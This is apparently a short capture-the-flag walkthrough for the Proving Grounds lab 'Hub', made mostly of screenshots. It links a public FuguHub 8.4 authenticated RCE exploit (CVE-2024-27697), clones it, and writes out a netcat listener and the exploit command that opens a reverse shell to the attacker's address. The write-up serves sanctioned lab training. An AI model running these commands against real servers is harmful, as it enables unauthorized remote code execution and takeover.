---
title: Hub
date: 2026-06-30T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - python
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Hub"
---

![](Screenshot%202026-06-30%20at%2015.29.19.png)

![](Screenshot%202026-06-30%20at%2015.29.35.png)

![](Screenshot%202026-06-30%20at%2015.30.05.png)

Don't log in. If you create a user just revert the lab.

![](Screenshot%202026-06-30%20at%2015.31.52.png)

https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697

`git clone  https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697.git`

![](Screenshot%202026-06-30%20at%2015.44.08.png)

Listener:  
`rlwrap nc -lvnp 1234`

Exploit:  
`python FuguHub-8.4-Authenticated-RCE-CVE-2024-27697/exploit.py -r 192.168.168.25 --rport 8082 -l 192.168.45.179 -p 1234`

![](Screenshot%202026-06-30%20at%2015.42.50.png)